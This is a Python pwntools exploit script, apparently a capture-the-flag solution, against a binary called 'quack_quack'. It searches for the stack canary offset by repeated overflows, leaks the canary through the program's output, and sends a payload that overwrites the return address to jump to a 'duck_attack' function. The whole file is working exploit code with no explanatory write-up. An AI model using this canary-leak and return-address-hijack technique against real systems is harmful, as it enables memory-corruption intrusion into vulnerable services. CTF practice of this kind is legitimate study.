from pwn import *
import time

# Function to find canary offset
def find_canary_offset(binary_path, max_offset=200):
    print(f"[*] Testing offsets to find canary location...")
    
    for i in range(8, max_offset, 8):  # Test in 8-byte chunks for efficiency
        # Create a new process
        p = process(binary_path)
        
        # Try to reach the second read
        p.recvuntil(b"> ")
        p.sendline(b"Quack Quack ")  # Valid input to pass first check
        
        # Receive the prompt for the second input
        p.recvuntil(b"> ")
        
        # Send payload of increasing size to overflow the buffer
        payload = cyclic(i)  # Generate a De Bruijn pattern
        p.sendline(payload)
        
        # Check if the process crashes due to stack canary corruption
        result = p.recvall(timeout=1)
        p.close()
        
        if b"stack smashing detected" in result:
            # We found where we're corrupting the canary
            print(f"[+] Found canary corruption at offset: {i-8} to {i}")
            
            # Now refine the search for exact offset
            for j in range(i-8, i):
                p = process(binary_path)
                p.recvuntil(b"> ")
                p.sendline(b"Quack Quack ")
                p.recvuntil(b"> ")
                
                payload = b"A" * j
                p.sendline(payload)
                
                result = p.recvall(timeout=1)
                p.close()
                
                if b"stack smashing detected" in result:
                    print(f"[+] Exact canary offset: {j}")
                    return j
            
            # If we can't find the exact offset
            return i-8
    
    print("[-] Could not find canary offset within the specified range")
    return None

# Main exploit
def main():
    binary = "./quack_quack"
    
    # Find the canary offset
    #canary_offset = find_canary_offset(binary)
    
    #if canary_offset is None:
     #   print("[-] Failed to find canary offset, exiting")
      #  return
    
    #print(f"[*] Using canary offset: {canary_offset}")
    context.terminal = ['tmux', 'split-window', '-h']
    if len(sys.argv) > 1 and sys.argv[1] == "gdb":
        target = gdb.debug('./quack_quack', '''
        break duckling
        break *0x4014bc
        break *0x4015a7
        break *0x4015c4  # After the printf
        break *0x4015df
        continue
        ''')
    else:
        target = process('./quack_quack')  # For local process
    # target = remote('hostname', port)  # For remote connection

    
    # First payload to leak the canary
    target.recvuntil(b"> ")
    first_payload = b"A" * 89 + b"Quack Quack "  # Use our known working offset
    target.sendline(first_payload)
    
    # Get response with leaked canary bytes
    response = target.recvuntil(b"> ", drop=True)
    print("[*] Response:", response)
    
    # Extract the leaked bytes (after the NULL)
    leak = response.split(b'Quack Quack ')[1].split(b', ready')[0]
    print("[*] Leaked bytes:", leak.hex(), f"Length: {len(leak)}")
    
    # Reconstruct the full canary
    full_canary = b'\x00' + leak[:7]
    canary = u64(full_canary)
    print(f"[+] Reconstructed canary: 0x{canary:016x}")
    
    # Craft the second payload to execute duck_attack
    duck_attack_addr = 0x40137f
    
    # Payload structure: buffer + canary + saved RBP + return address
    second_payload = b"A" * 88  + p64(canary) + b"B" * 4 +  b"C" * 4 + b"\x7f\x13"
    target.sendline(second_payload)
    
    # Get the flag
    print("[*] Executing duck_attack to get the flag...")
    target.interactive()

if __name__ == "__main__":
    main()
